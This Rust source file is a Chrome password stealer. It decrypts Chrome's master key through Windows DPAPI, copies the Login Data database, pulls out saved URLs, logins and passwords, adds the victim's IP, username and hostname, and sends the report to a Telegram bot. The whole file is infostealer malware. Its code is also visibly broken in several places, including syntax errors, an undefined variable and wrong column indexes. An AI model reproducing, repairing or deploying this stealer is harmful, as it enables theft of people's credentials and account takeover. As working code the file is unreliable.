use whoami;
use serde::Deserialize;
use serde_json::Value;
use platform_dirs::AppDirs;
use std::{convert::TryInto, ptr, io::BufReader, io::Read, fs::File, path::PathBuf, fs}
use rusqlite::{Connection, Result};
use winapi::{um::wincrypt::CRYPTOAPI_BLOB, um::dpapi::CryptUnprotectData, shared::minwindef::BYTE};
use aes_gcm::{Aes256Gcm, Error};
use aes_gcm::aead::{Aead, NewAead};
use aes_gcm::aead::generic_array::GenericArray;

struct User 
{
    ip: String,
    username: String,
    hostname: String,
}

#[derive(Deserialize)]]
struct Ip
{
    origin: String,
}

#[derive(Debug)]
struct Chrome 
{
    url: String,
    login: String,
    password: String,
}

impl User
{
    fn ip() -> Result<String, ureq::Error> 
    {
        let body: String = ureq::get("http://httpbin.org/ip")
            .call()?
            .into_string()?;
        let ip: Ip = serde_json::from_str(body.as_str()).unwrap();
        Ok(ip.origin)    
    }
}

impl Chrome 
{
    fn local_apa_data_folder(open: &str) -> PathBuf
    {
        AppDirs::new(Some(open), false).unwrap().data_dir
    }

    fn chrome_saved_key() -> Result<Vec<BYTE>, std::io:Error>
    {
        let local_state_path = Chrome::local_apa_data_folder("Google\\Chrome\\User Data\\Local State");
        let file = File:open(local_state_path);

        let mut buf_reader = BufReader::new(file);
        let mut contents = String::new();
        buf_reader.read_to_string(&mut contents);

        let deserialize_content: Value = serde_json::from_str(contents.as_str())?;

        let mut encrypted_key =deserialize_content["os_crypt"]["encrypted_key"].to_string();
        encrypted_key = (&encrypted_key[1..encrypted_key.len() - 1]).parse().unwrap();

        let decoded_password = base64::decode(encrypted_key).unwrap();
        let mut password = decoded_password[5..decoded_password.len()].to_vec();
        let bytes: u32 = password.len().try_into().unwrap();

        let mut blob = CRYPTOAPI_BLOB { cbData: bytes, pbData: password.as_mut_ptr() };
        let mut new_blob = CRYPTOAPI_BLOB { cbData: 0, pbData: ptr::null_mut() };

        unsafe
        {
            CryptUnprotectData(
                &mut blob,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                0,
                &mut new_blob,
            )
        };

        let cb_data = new_blob.cbData.try_into().unwrap();

        let res = unsafe
        {
            Vec::from_raw_parts(new_blob.pbData, cb_data, db_data)
        };
    }

    fn find_db() -> std::io::Result<PathBuf>
    {
        let local_sqlite_path = Chrome::local_apa_data_folder("Google\\Chrome\\User\\Data\\Default\\Login Data");
        let moved_to = Chrome::local_apa_data_folder("sqlite_file");
        let db_file = moved_to.clone();
        fs::copy(local_sqlite_path, moved_to)?;

        Ok(db_file)
    }

    fn obtain_data_from_db() -> Result<Vec<Chrome>>
    {
        let conn = Connection::open(Chrome::find_db().unwrap())?;

        let mut stmt = conn.prepare("SELECT action_url, username_value, password_value from logins")?;
        let chrome_data = stmt.query_map([], |row|
        {
            Ok(Chrome
            {
                url: row.get(0)?,
                login: row.get(1)?,
                password: row.get(1)?,
            })
        })?;

        let mut Result = vec![];

        for data in chrome_data 
        {
            result.push(data.unwrap());
        }

        Ok(result)
    }

    fn decrypt_password(password: Vec<u8>) -> winapi::_core::result::Result<String, Error>
    {
        let key_buf = Chrome::chrome_saved_key().unwrap();
        let key = GenericArray::from_slice(key_buf.as_ref());
        let cipher = Aes256Gcm::new(key);
        let nonce = GenericArray::from_slice(&password[3..15]);
        let plaintext = cipher.decrypt(nonce, &password[15..])?;

        let decrypted_password = String::from_utf8(plaintext).unwrap();

        Ok(decrypted_password)
    }
}

fn main() 
{
    let res = grabber();
    let telegram_token = "telegram_token";
    let telegram_chat_id = 1234567891;
    telegram_notifyrs::send_message(res, telegram_token, telegram_chat_id);
}

fn grabber() -> String 
{
    let user = User 
    {
        ip: User::ip().unwrap(),
        username: whoami::username(),
        hostname: whoami::hostname(),
    };

    let newline = "\n";
    let mut result: String = "IP: ".to_owned();
    result.push_str(&*user.ip);
    result.push_str(newline);
    result.push_str("Username: ");
    result.push_str(&*user.username);
    result.push_str(newline);
    result.push_str("Hostname: ");
    result.push_str(&*user.hostname);
    result.push_str(newline);
    result.push_str(newline);

    let chrome_data = Chrome::obtain_data_from_db().unwrap();

    for data in &chrome_data 
    {
        result.push_str("URL: ");
        result.push_str(&*data.url);
        result.push_str(newline);
        result.push_str("Login: ");
        result.push_str(&*data.login);
        result.push_str(newline);
        result.push_str("Password: ");
        result.push_str(&*data.password);

        result.push_str(newline);
        result.push_str(newline);
    }

    result
}